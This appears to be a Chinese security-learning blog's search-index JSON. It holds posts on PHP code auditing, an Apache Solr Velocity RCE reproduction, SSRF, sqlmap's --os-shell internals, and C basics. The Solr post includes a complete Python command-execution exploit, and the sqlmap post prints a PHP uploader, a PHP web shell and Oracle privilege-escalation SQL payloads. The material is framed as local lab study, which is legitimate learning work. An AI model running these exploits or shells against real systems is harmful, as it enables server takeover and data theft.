{"meta":{"title":"九指","subtitle":"","description":"","author":"九指","url":"","root":"/"},"pages":[{"title":"404","date":"2020-02-16T10:16:57.000Z","updated":"2020-02-16T10:16:57.265Z","comments":true,"path":"404/index-1.html","permalink":"/404/index-1.html","excerpt":"","text":""},{"title":"404","date":"2019-05-13T11:40:20.000Z","updated":"2019-05-13T11:40:20.134Z","comments":true,"path":"404/index.html","permalink":"/404/index.html","excerpt":"","text":""},{"title":"关于自己","date":"2019-04-19T05:45:20.000Z","updated":"2019-04-20T14:26:16.961Z","comments":true,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"我不是什么大牛（其实就是菜鸡），只是因为爱好来到了这个圈子，有幸遇到了大牛们。我只是目前在默默努力向大牛进发的一个小菜鸟！ 一直觉得一句诗是很好的，学技术就是一个从学习到熟练的过程： 操千曲而后晓声，观千剑而后识器我想对自己说：选择的路，不要后悔。乘风破浪会有时，直挂云帆济沧海。 2018-04-24 22:22:19"},{"title":"categories","date":"2020-01-15T08:30:37.273Z","updated":"2020-01-15T08:30:37.273Z","comments":true,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2019-04-19T05:45:11.000Z","updated":"2019-04-19T05:49:53.021Z","comments":true,"path":"friends/index.html","permalink":"/friends/index.html","excerpt":"","text":""},{"title":"search","date":"2020-02-16T10:16:47.000Z","updated":"2020-02-16T10:16:47.393Z","comments":true,"path":"search/index-1.html","permalink":"/search/index-1.html","excerpt":"","text":""},{"title":"tags","date":"2020-01-15T08:30:47.000Z","updated":"2020-01-15T08:42:19.571Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"search","date":"2019-05-13T11:40:09.000Z","updated":"2019-05-13T11:40:09.226Z","comments":true,"path":"search/index.html","permalink":"/search/index.html","excerpt":"","text":""}],"posts":[{"title":"PHP代码审计初学","slug":"PHP代码审计初学","date":"2020-01-14T16:00:00.000Z","updated":"2020-02-19T15:14:41.838Z","comments":true,"path":"2020/01/15/PHP代码审计初学/","link":"","permalink":"/2020/01/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E5%AD%A6/","excerpt":"学习一下。","text":"学习一下。 审计原理&emsp;之前学习开发的时候，老师说开发就是把麻烦留给自己，把简单留给用户，但是学习了安全那么久，我发现web端的安全，都是因为web端在某些地方被用户传入了有危害的参数，形成了漏洞利用，所以审计的原理也是主要看哪里的参数可以用于外部利用，然后可以构造利用漏洞的payload。 审计方式&emsp;看了几天文章，审计方式大概分三种吧。 1：通读全文&emsp;通读全文就是把整个web的开发都读过去一遍，再一点一点的构造payload，不过时间上花的会比较长，不过检查的很完整，不会有遗漏。 2：危险函数分析&emsp;用Seay源代码审计系统，搜索危险函数，看看危险函数有没有可控的传参，有的话再构造payload进行利用，这个比较快捷，可以找到直接可以利用的漏洞，危险函数我在之前的文章有过简要分析了，传统的web漏洞也在靶场哪里做过分析，所以只要根据那些漏洞原理，去搜索一些函数进行分析就可以了，但是这个方法也有弊端，一些逻辑上的漏洞就用这种方法找不到了。 3：搭建分析&emsp;将web搭建起来，就像黑盒测试一样去进行漏洞挖掘了，这个就看个人平时黑盒的本事了，自己对于漏洞的理解，自己去挖掘，因为是本地搭建，构建payload的时候也可以看着代码去进行构造，一些逻辑漏洞也能挖掘到。 工具&emsp;Seay源代码审计工具——用于搜索函数 &emsp;phpstorm——通读整个web &emsp;phpstudy——搭建web &emsp;sublime——调试 ​ 火狐浏览器+hackbar——做web端传参调试 练习&emsp;三种方式。通读全文我就不做练习了，看完全部代码，我的开发水平看起来还是挺费时间的，我就在这里做一下危险函数+搭建分析。 &emsp;不过搭建分析，都是拿前面的靶场来做练习的，还没有拿过其他开源的cms做练习，希望自己之后也能抽出时间来多练练审计，对自己在渗透能更熟练，这里只琢磨一些审计的方式。 &emsp;先用Seay源代码审计来做一下演示，用pikachu靶场来做分析。 &emsp;看一下，主要有6种类型漏洞吧，有代码执行，sql注入，文件上传，任意文件读取，获取ip方式伪造，文件包含。 &emsp;前面我们演示靶场文章里面，这些漏洞大致上都有，我们来看看他自动审计是一个怎么样的判断的。 &emsp;看一下第一个审计出来的漏洞。 &emsp;这里的危险函数是一个eval，后面拼接了一个post请求提交的txt参数。查看web界面： &emsp;是有个输入框，输入框内的内容是是txt的参数内容，外部用户可控，可以构造命令拼接进去执行，前面文章演示过了，这里不演示了。 &emsp;好懒，剩下的漏洞不想一个个去试了，总结的来说，这个自动审计都是先寻找全局，可能存在漏洞的函数，再看他后面是否拼接了可控的变量，然后你在自己溯源，去看那些变量是否是外部可控的，然后在构造payload。存在很多误报，而且也不全面，只能是短时间快速审计用的，能够完全摸索出一个web存在的漏洞还是得靠实实在在的全文审计。","categories":[{"name":"PHP","slug":"PHP","permalink":"/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"/tags/PHP/"}]},{"title":"Apache_Solr漏洞复现","slug":"Apache Solr漏洞复现","date":"2019-12-07T16:00:00.000Z","updated":"2019-12-08T09:38:50.372Z","comments":true,"path":"2019/12/08/Apache Solr漏洞复现/","link":"","permalink":"/2019/12/08/Apache%20Solr%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"10月底的漏洞，做一下本地复现。也写了验证脚本。","text":"10月底的漏洞，做一下本地复现。也写了验证脚本。 环境搭建 jdk1.8 官网下载的环境源码。http://archive.apache.org/dist/lucene/solr/8.1.1/solr-8.1.1.zip 直接进到bin目录下，cmd执行solr start。就可以了。 创建一个core。 一般会出现报错。 先别着急点击Add Core，先去目录下创建几个文件。 首先去目录:solr安装目录/solr-8.1.1\\server\\solr/ 创建一个名字为new_core的文件夹 然后拷贝当前目录下:solr安装目录/solr-8.1.1\\server\\solr\\configsets_default下的conf目录拷贝到new_core目录下 然后再点击创建即可 攻击条件： 知道Core的命名 查看Core的命名请求这个地址就可以看见Core的命名。 1http://127.0.0.1:8983/solr/admin/cores?wt=json&amp;indexInfo=false 写个代码获取命名： 1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsimport jsonimport sysdef getname(url): url += \"/solr/admin/cores?wt=json&amp;indexInfo=false\" conn = requests.request(\"GET\", url=url) name = \"test\" try: name = list(json.loads(conn.text)[\"status\"])[0] except: pass print namegetname('http://127.0.0.1:8983') payload攻击payload就不说了，有很多文章了。 演示效果就好了。 给一份K8哥哥的shell源码（不做解析了，总得流程就是，第一步获取命名，第二步post请求包修改core，第三步执行命令）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsimport jsonimport sysreload(sys) sys.setdefaultencoding('utf8')def getname(url): url += \"/solr/admin/cores?wt=json&amp;indexInfo=false\" conn = requests.request(\"GET\", url=url) name = \"test\" try: name = list(json.loads(conn.text)[\"status\"])[0] except: pass return namedef upconfig(url, name): url += \"/solr/\"+name+\"/config\" print \"Upconfig: \", url headers = &#123;\"Content-Type\": \"application/json\"&#125; post_data = \"\"\" &#123; \"update-queryresponsewriter\": &#123; \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" &#125; &#125; \"\"\" conn = requests.request(\"POST\", url, data=post_data, headers=headers) if conn.status_code != 200: print \"Upconfig error: \", conn.status_code sys.exit(1)def poc(url,cmd): core_name = getname(url) upconfig(url, core_name) url += \"/solr/\"+core_name+\"/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\"+cmd+\"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" conn = requests.request(\"GET\", url) print \"ExecCmd: \"+conn.textif __name__ == '__main__': url = 'http://127.0.0.1:8983' cmd = 'whoami' poc(url,cmd)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"SSRF分析","slug":"SSRF","date":"2019-12-06T16:00:00.000Z","updated":"2019-12-07T09:27:42.410Z","comments":true,"path":"2019/12/07/SSRF/","link":"","permalink":"/2019/12/07/SSRF/","excerpt":"​ 很多Web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL，Web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。 ​ 服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。","text":"​ 很多Web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL，Web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。 ​ 服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。 源码​ 用了书上的一个源码。 12345678910111213141516171819&lt;?phpfunction curl($url)&#123; //定义一个函数curl，参数url // 创建一个新cURL资源 $ch=curl_init(); // 设置URL和相应的选项 curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); // 抓取URL并把它传递给浏览器 curl_exec($ch); //关闭cURL资源，并且释放系统资源 curl_close($ch);&#125;$url=$_GET['url'];curl($url);?&gt; 分析： ​ 这个源码获取了url的传参，没进行校验和过滤，拼接到curl函数内直接调用执行。 利用利用方式： 可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。 攻击运行在内网或者本地的应用程序。 对内网web应用进行指纹识别，通过访问默认文件实现 。 攻击内外网的web应用。sql注入、struct2、redis等。 利用file协议读取本地文件等。 端口扫描： 读取文件：","categories":[{"name":"PHP","slug":"PHP","permalink":"/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"/tags/PHP/"}]},{"title":"sqlmap-os-shell分析","slug":"sqlmap-os-shell分析","date":"2019-11-25T04:00:00.000Z","updated":"2019-12-07T09:34:21.399Z","comments":true,"path":"2019/11/25/sqlmap-os-shell分析/","link":"","permalink":"/2019/11/25/sqlmap-os-shell%E5%88%86%E6%9E%90/","excerpt":"闲着无聊，琢磨一下sqlmap-os-shell。","text":"闲着无聊，琢磨一下sqlmap-os-shell。 MySQL环境：phpstudy，Apache2.4.39，MySQL5.7.26 条件： （1）网站必须是root权限 （2）攻击者需要知道网站的绝对路径 （3）GPC为off，php主动转义的功能关闭 （4）MySQL允许写入文件 php源码： 12345678910111213141516171819202122232425262728293031323334&lt;?php/*写这个php最初目的是为了给自己测WAF用，和深入了解SQL注入。可以打印你查询的结果，和打印你调用的SQL语句。使用到了pikachu的库*/// 设置编码为utf-8header(\"Content-Type: text/html;charset=utf-8\");$servername = \"localhost\";$username = \"root\";$password = \"root\"; // 创建连接$conn = new mysqli($servername, $username, $password); // 检测连接if ($conn-&gt;connect_error) &#123; die(\"连接失败: \" . $conn-&gt;connect_error);&#125; echo \"连接成功\";$chaxun = $_GET[\"id\"];mysqli_query($conn,'use pikachu;');//连接数据库并使用pikachu库$sql = \"SELECT * FROM users WHERE username= '$chaxun'\";//查询语句$result = mysqli_query($conn,$sql);//使用mysqli_query函数调用sql语句while($row = $result-&gt;fetch_assoc()) &#123;//查询后的结果集里取一行并赋值给row echo \"&lt;br&gt;账号：\".$row['username'];//打印user行的内容 echo \"&lt;br&gt;\"; echo \"密码：\".$row['password']; &#125;print \"&lt;br&gt;&lt;b&gt;SQL语句为：&lt;/b&gt;$sql&lt;/br&gt;\";//加粗并换行打印出来$conn-&gt;close();//查询后不管有没有都记得关闭数据库?&gt; php设置自动转义 MySQL设置可以写入文件看了一下sqlmap执行os-shell的第一个payload，是一个写入文件的操作，我直接在mysql内执行出现报错。 开始执行语句的时候，提示报错。 通过报错的提示可以发现是由于secure-file-priv变量的设置所引起的 。然后我在mysql的配置文件里面加secure-file-priv的变量配置。 说明： secure_file_prive=null 限制mysqld 不允许导入导出 secure_file_priv=/var/lib/mysql-files/ 限制mysqld的导入导出只能发生在/var/lib/mysql-files/目录下 secure_file_priv=’ ‘ 不对mysqld的导入导出做限制 执行数据库语句以后，效果如下 1SELECT * FROM users WHERE username= 'admin' limit 0,1 INTO OUTFILE 'D:/phpstudy_pro/WWW/tmpuslcm.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- sqlmap的第一个payload就是写入一个php上传文件的web。 看看sqlmap写入一个上传文件的web之后的操作。 sqlmap又通过之前写入的上传文件的php，上传了一个php。看一下这个php的代码。 1&lt;?php $c=$_REQUEST[\"cmd\"];@set_time_limit(0);@ignore_user_abort(1);@ini_set(\"max_execution_time\",0);$z=@ini_get(\"disable_functions\");if(!empty($z))&#123;$z=preg_replace(\"/[, ]+/\",',',$z);$z=explode(',',$z);$z=array_map(\"trim\",$z);&#125;else&#123;$z=array();&#125;$c=$c.\" 2&gt;&amp;1/n\";function f($n)&#123;global $z;return is_callable($n)and!in_array($n,$z);&#125;if(f(\"system\"))&#123;ob_start();system($c);$w=ob_get_clean();&#125;elseif(f(\"proc_open\"))&#123;$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1]))&#123;$w.=fread($t[1],512);&#125;@proc_close($y);&#125;elseif(f(\"shell_exec\"))&#123;$w=shell_exec($c);&#125;elseif(f(\"passthru\"))&#123;ob_start();passthru($c);$w=ob_get_clean();&#125;elseif(f(\"popen\"))&#123;$x=popen($c,r);$w=NULL;if(is_resource($x))&#123;while(!feof($x))&#123;$w.=fread($x,512);&#125;&#125;@pclose($x);&#125;elseif(f(\"exec\"))&#123;$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);&#125;else&#123;$w=0;&#125;echo\"&lt;pre&gt;$w&lt;/pre&gt;\";?&gt; 一个web马，就和sqlmap连接成一个交互式的shell。 总结sqlmap-os-shell的MySQL执行条件，php开启了自动转义，MySQL执行开启了写入函数。 存在注入的前提，配置不当。 MSSQL​ 我就不想搭建环境做分析了，我在freebuf，看到一篇解析得很清楚的文章。 技术分享：MSSQL注入xp_cmdshell 总结mssql的os-shell，在注入的前提下，调用mssql的xp_cmdshell组件，执行系统命令，如果没有开启xp_cmdshell，可以使用mssql的sa用户权限开启xp_cmdshell组件。 oracle这个我也没搭建环境，但是我还是找到了一篇文章，解析得挺清楚的，sqlmap的os shell的payload都放在这个目录下 看一下的payload 1234SELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('%RANDSTR1%','%RANDSTR2%','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"OsUtil\" as import java.io.*; public class OsUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;'''';END;'';END;--','SYS',0,'1',0) FROM DUALSELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('%RANDSTR1%','%RANDSTR2%','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''&lt;&gt;'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) FROM DUALSELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('%RANDSTR1%','%RANDSTR2%','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function OSREADFILE(filename in varchar2) return varchar2 as language java name ''''''''OsUtil.readFile(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) FROM DUALSELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('%RANDSTR1%','%RANDSTR2%','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on OSREADFILE to public'''';END;'';END;--','SYS',0,'1',0) FROM DUAL 分析一下payload，也是看文章分析的。 （1) 创建Java库 1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"LinxUtil\" as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;'''';END;'';END;--','SYS',0,'1',0) from dual (2) 赋予Java权限 1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&gt;'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual (3) 创建函数 1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual (4) 赋予函数执行权限 1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--','SYS',0,'1',0) from dual 参考这篇文章。 一次综合渗透测试 总结因为我本地没复现，完成这个payload的条件，我只能从别人文章哪里抄下来了，但是也是通过sql函数写一个交互式的shell。 条件： GET_DOMAIN_INDEX_TABLES函数注入漏洞影响版本:Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2漏洞的成因是该函数的参数存在注入，而该函数的所有者是sys，所以通过注入就可以执行任意sql，该函数的执行权限为public，所以只要遇到一个oracle的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。————————————————原文链接：https://blog.csdn.net/weixin_38023368/article/details/76922153 postgresql这里找不到postgresql的os shell的payload。可是我看见看见postgresql数据库好像有写入文件函数，有点离谱。 1COPY (select '&lt;?php phpinfo();?&gt;') to '/tmp/1.php'; 但是这里的payload没有了，我也懒得搭建环境分析了。","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"C语言学习笔记","slug":"C语言学习笔记","date":"2019-11-06T04:00:00.000Z","updated":"2019-11-16T07:57:39.969Z","comments":true,"path":"2019/11/06/C语言学习笔记/","link":"","permalink":"/2019/11/06/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"学习C语言，自己做的笔记。其实大多是抄菜鸟教程的，只是是自己理解要记的部分。","text":"学习C语言，自己做的笔记。其实大多是抄菜鸟教程的，只是是自己理解要记的部分。 C语言学习笔记C 程序结构C 程序主要包括以下部分： 预处理器指令 函数 变量 语句 &amp; 表达式 注释 123456789#include &lt;stdio.h&gt; int main()&#123; /* 我的第一个 C 程序 */ printf(\"Hello, World! \\n\"); return 0;&#125; 程序的第一行 *#include * 是预处理器指令，告诉 C 编译器在实际编译之前要包含 stdio.h 文件。 下一行 int main() 是主函数，程序从这里开始执行。 下一行 /…/ 将会被编译器忽略，这里放置程序的注释内容。它们被称为程序的注释。 下一行 printf(…) 是 C 中另一个可用的函数，会在屏幕上显示消息 “Hello, World!”。 下一行 return 0; 终止 main() 函数，并返回值 0。 C 基本语法 C 程序由各种令牌组成，令牌可以是关键字、标识符、常量、字符串值，或者是一个符号。 下表列出了 C 中的保留字。这些保留字不能作为常量名、变量名或其他标识符名称。 关键字 说明 auto 声明自动变量 break 跳出当前循环 case 开关语句分支 char 声明字符型变量或函数返回值类型 const 声明只读变量 continue 结束当前循环，开始下一轮循环 default 开关语句中的”其它”分支 do 循环语句的循环体 double 声明双精度浮点型变量或函数返回值类型 else 条件语句否定分支（与 if 连用） enum 声明枚举类型 extern 声明变量或函数是在其它文件或本文件的其他位置定义 float 声明浮点型变量或函数返回值类型 for 一种循环语句 goto 无条件跳转语句 if 条件语句 int 声明整型变量或函数 long 声明长整型变量或函数返回值类型 register 声明寄存器变量 return 子程序返回语句（可以带参数，也可不带参数） short 声明短整型变量或函数 signed 声明有符号类型变量或函数 sizeof 计算数据类型或变量长度（即所占字节数） static 声明静态变量 struct 声明结构体类型 switch 用于开关语句 typedef 用以给数据类型取别名 unsigned 声明无符号类型变量或函数 union 声明共用体类型 void 声明函数无返回值或无参数，声明无类型指针 volatile 说明变量在程序执行中可被隐含地改变 while 循环语句的循环条件 C 数据类型在 C 语言中，数据类型指的是用于声明不同类型的变量或函数的一个广泛的系统。变量的类型决定了变量存储占用的空间，以及如何解释存储的位模式。 C 中的类型可分为以下几种： 序号 类型与描述 1 基本类型： 它们是算术类型，包括两种类型：整数类型和浮点类型。 2 枚举类型： 它们也是算术类型，被用来定义在程序中只能赋予其一定的离散整数值的变量。 3 void 类型： 类型说明符 void 表明没有可用的值。 4 派生类型： 它们包括：指针类型、数组类型、结构类型、共用体类型和函数类型。 整数类型下表列出了关于标准整数类型的存储大小和值范围的细节： 类型 存储大小 值范围 char 1 字节 -128 到 127 或 0 到 255 unsigned char 1 字节 0 到 255 signed char 1 字节 -128 到 127 int 2 或 4 字节 -32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647 unsigned int 2 或 4 字节 0 到 65,535 或 0 到 4,294,967,295 short 2 字节 -32,768 到 32,767 unsigned short 2 字节 0 到 65,535 long 4 字节 -2,147,483,648 到 2,147,483,647 unsigned long 4 字节 0 到 4,294,967,295 浮点类型下表列出了关于标准浮点类型的存储大小、值范围和精度的细节： 类型 存储大小 值范围 精度 float 4 字节 1.2E-38 到 3.4E+38 6 位小数 double 8 字节 2.3E-308 到 1.7E+308 15 位小数 long double 16 字节 3.4E-4932 到 1.1E+4932 19 位小数 头文件 float.h 定义了宏，在程序中可以使用这些值和其他有关实数二进制表示的细节。下面的实例将输出浮点类型占用的存储空间以及它的范围 void 类型void 类型指定没有可用的值。它通常用于以下三种情况下： 序号 类型与描述 1 函数返回为空 C 中有各种函数都不返回值，或者您可以说它们返回空。不返回值的函数的返回类型为空。例如 void exit (int status); 2 函数参数为空 C 中有各种函数不接受任何参数。不带参数的函数可以接受一个 void。例如 int rand(void); 3 指针指向 void 类型为 void * 的指针代表对象的地址，而不是类型。例如，内存分配函数 void *malloc( size_t size ); 返回指向 void 的指针，可以转换为任何数据类型。 C 变量变量其实只不过是程序可操作的存储区的名称。C 中每个变量都有特定的类型，类型决定了变量存储的大小和布局，该范围内的值都可以存储在内存中，运算符可应用于变量上。 变量的名称可以由字母、数字和下划线字符组成。它必须以字母或下划线开头。大写字母和小写字母是不同的，因为 C 是大小写敏感的。 类型 描述 char 通常是一个字节（八位）。这是一个整数类型。 int 对机器而言，整数的最自然的大小。 float 单精度浮点值。单精度是这样的格式，1位符号，8位指数，23位小数。 double 双精度浮点值。双精度是1位符号，11位指数，52位小数。 void 表示类型的缺失。 实例 12345678910111213141516171819202122232425#include &lt;stdio.h&gt; // 函数外定义变量 x 和 yint x;int y;int addtwonum()&#123; // 函数内声明变量 x 和 y 为外部变量 extern int x; extern int y; // 给外部变量（全局变量）x 和 y 赋值 x = 1; y = 2; return x+y;&#125; int main()&#123; int result; // 调用函数 addtwonum result = addtwonum(); printf(\"result 为: %d\",result); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1result 为: 3 C 常量整数常量整数常量可以是十进制、八进制或十六进制的常量。前缀指定基数：0x 或 0X 表示十六进制，0 表示八进制，不带前缀则默认表示十进制。 整数常量也可以带一个后缀，后缀是 U 和 L 的组合，U 表示无符号整数（unsigned），L 表示长整数（long）。后缀可以是大写，也可以是小写，U 和 L 的顺序任意。 下面列举几个整数常量的实例： 12345212 /* 合法的 */215u /* 合法的 */0xFeeL /* 合法的 */078 /* 非法的：8 不是八进制的数字 */032UU /* 非法的：不能重复后缀 */ 以下是各种类型的整数常量的实例： 123456785 /* 十进制 */0213 /* 八进制 */0x4b /* 十六进制 */30 /* 整数 */30u /* 无符号整数 */30l /* 长整数 */30ul /* 无符号长整数 */ 浮点常量浮点常量由整数部分、小数点、小数部分和指数部分组成。您可以使用小数形式或者指数形式来表示浮点常量。 当使用小数形式表示时，必须包含整数部分、小数部分，或同时包含两者。当使用指数形式表示时， 必须包含小数点、指数，或同时包含两者。带符号的指数是用 e 或 E 引入的。 下面列举几个浮点常量的实例： 123453.14159 /* 合法的 */314159E-5L /* 合法的 */510E /* 非法的：不完整的指数 */210f /* 非法的：没有小数或指数 */.e55 /* 非法的：缺少整数或分数 */ 字符常量字符常量是括在单引号中，例如，’x’ 可以存储在 char 类型的简单变量中。 字符常量可以是一个普通的字符（例如 ‘x’）、一个转义序列（例如 ‘\\t’），或一个通用的字符（例如 ‘\\u02C0’）。 在 C 中，有一些特定的字符，当它们前面有反斜杠时，它们就具有特殊的含义，被用来表示如换行符（\\n）或制表符（\\t）等。下表列出了一些这样的转义序列码： 转义序列 含义 \\ \\ 字符 &#39; ‘ 字符 &quot; “ 字符 ? ? 字符 \\a 警报铃声 \\b 退格键 \\f 换页符 \\n 换行符 \\r 回车 \\t 水平制表符 \\v 垂直制表符 \\ooo 一到三位的八进制数 \\xhh . . . 一个或多个数字的十六进制数 字符串常量1234567\"hello, dear\"\"hello, \\dear\"\"hello, \" \"d\" \"ear\" 定义常量在 C 中，有两种简单的定义常量的方式： 使用 #define 预处理器。 使用 const 关键字。 #define 预处理器下面是使用 #define 预处理器定义常量的形式： 1#define identifier value 实例 1234567891011121314151617#include &lt;stdio.h&gt; #define LENGTH 10 #define WIDTH 5#define NEWLINE '\\n' int main()&#123; int area; area = LENGTH * WIDTH; printf(\"value of area : %d\", area); printf(\"%c\", NEWLINE); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1value of area : 50 const 关键字您可以使用 const 前缀声明指定类型的常量，如下所示： 1const type variable = value; 实例 